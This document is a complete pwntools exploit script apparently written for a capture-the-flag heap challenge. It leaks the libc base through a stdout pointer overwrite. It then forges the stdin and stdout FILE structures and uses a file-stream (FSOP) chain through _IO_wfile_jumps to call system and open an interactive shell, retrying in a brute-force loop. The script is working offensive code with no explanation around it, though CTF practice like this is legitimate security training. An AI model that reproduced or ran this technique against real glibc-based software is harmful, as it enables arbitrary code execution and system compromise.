#!/usr/bin/env python3

from pwn import *

exe = ELF('./vuln_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def create(size, data):
	sla(b"> ", b"1")
	sla(b"size: ", f"{size}".encode())
	sla(b"content: ", data)

def edit(idx):
	sla(b"> ", b"3")
	sla(b": ", f"{idx}".encode())

script = '''
# scanf choice
brva 0x153A
'''

while(True):
	try:
		#p = remote("multiplication.chal.imaginaryctf.org", 1337)
		p = process('./vuln_patched')
		#p = gdb.debug('./vuln_patched', gdbscript = script)

		create(0x100000, b"A" * 8)
		# ptr chunk is now below libc

		# expand stdout write ptr
		edit(0x3085d8)

		p.recv(5)
		libc_base = u64(p.recv(8)) - libc.symbols['_IO_stdfile_1_lock']
		lleak("libc_base", libc_base)

		#debug()

		# expand stdin buf end + 1 (require bruteforces here, hope it will cover full stdout)
		edit(0x307911)

		# restore stdin
		x = b"12345" # _shortbuf
		x += p64(libc_base + libc.symbols['_IO_stdfile_0_lock']) # _lock
		x += p64(0xffffffffffffffff) # _offset
		x += p64(0)
		x += p64(libc_base + libc.symbols['_IO_wide_data_0']) # _IO_wide_data_0
		x += p64(0) * 3
		x += p32(0xffffffff) # _mode
		x += p32(0) + p64(0) * 2
		x += p64(libc_base + libc.symbols['_IO_file_jumps']) # vtable
		payload = x

		# A LOT OF PADDING SKILL HERE

		## b *__vfscanf_internal+2053
		###  0x7f91d18b0035 <__vfscanf_internal+2053>    mov    rax, qword ptr [rbx + 0x68]     RAX, [_nl_global_locale+104] => 0x7f91d19f68c0 (_nl_C_LC_CTYPE_class+256) ◂— 0x2000200020002
		pad_len = libc_base + 0x2043c0 - (libc_base + libc.symbols['_IO_2_1_stdin_'] + 131) + 0x68
		payload = payload.ljust(pad_len, b"A")
		payload += p64(libc_base + 0x1b28c0)

		# padding into stdout, skip stderr (its works, io behaviour normal (i guess))
		pad_len = libc.symbols['_IO_2_1_stdout_'] - (libc.symbols['_IO_2_1_stdin_'] + 131)
		payload = payload.ljust(pad_len, b"A")

		# overwrite stdout
		## fsop (copy straight from note)
		_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
		system = libc_base + libc.symbols['system']
		fp = FileStructure()
		fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
		fp._IO_read_end = system
		fp._lock = _IO_2_1_stdout_ + 0x50
		fp._wide_data = _IO_2_1_stdout_
		fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
		fake_stdout = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)

		# send payload and trigger fsop
		payload += fake_stdout
		sla(b"> ", payload)

		sleep(0.5)
		sl(b"echo vanishing")
		rcu(b"vanishing")
		break
	except:
		try:
			p.close()
		except:
			pass

p.interactive()
